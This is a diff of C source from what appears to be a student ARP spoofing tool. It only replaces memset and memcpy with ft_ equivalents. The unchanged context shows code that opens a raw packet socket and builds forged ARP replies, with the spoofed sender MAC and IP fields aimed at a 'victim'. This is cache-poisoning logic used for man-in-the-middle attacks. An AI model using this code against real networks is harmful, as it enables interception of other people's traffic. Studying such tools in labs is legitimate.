@@ -31,7 +31,7 @@ int create_socket(t_session *session, char *interface)
         return (-1);
     }
 
-    memset(&session->sll, 0, sizeof(session->sll));
+    ft_memset(&session->sll, 0, sizeof(session->sll));
     session->sll.sll_family = AF_PACKET;
     session->sll.sll_ifindex = (int)ifindex;
     session->sll.sll_protocol = htons(ETH_P_ARP);
@@ -150,11 +150,11 @@ int send_arp_reply(t_session *session, t_options *opts)
     struct ethhdr *eth = (struct ethhdr *)buffer;
     struct ether_arp *arp = (struct ether_arp *)(buffer + sizeof(struct ethhdr));
 
-    memset(buffer, 0, sizeof(buffer));
+    ft_memset(buffer, 0, sizeof(buffer));
 
     /* 1. Ethernet Header */
-    memcpy(eth->h_dest, opts->target_mac, 6);       /* Unicast to Target */
-    memcpy(eth->h_source, opts->src_mac, 6);        /* Spoofed Source MAC */
+    ft_memcpy(eth->h_dest, opts->target_mac, 6);       /* Unicast to Target */
+    ft_memcpy(eth->h_source, opts->src_mac, 6);        /* Spoofed Source MAC */
     eth->h_proto = htons(ETH_P_ARP);
 
     /* 2. ARP Reply Header */
@@ -165,12 +165,12 @@ int send_arp_reply(t_session *session, t_options *opts)
     arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);        /* Opcode 2 = Reply */
 
     /* Sender Info (Spoofed Identity) */
-    memcpy(arp->arp_sha, opts->src_mac, 6);
-    memcpy(arp->arp_spa, &opts->src_ip, 4);
+    ft_memcpy(arp->arp_sha, opts->src_mac, 6);
+    ft_memcpy(arp->arp_spa, &opts->src_ip, 4);
 
     /* Target Info (Victim Identity) */
-    memcpy(arp->arp_tha, opts->target_mac, 6);
-    memcpy(arp->arp_tpa, &opts->target_ip, 4);
+    ft_memcpy(arp->arp_tha, opts->target_mac, 6);
+    ft_memcpy(arp->arp_tpa, &opts->target_ip, 4);
 
     /* 3. Send over the EXISTING socket */
     if (sendto(session->sockfd, buffer, sizeof(buffer), 0,
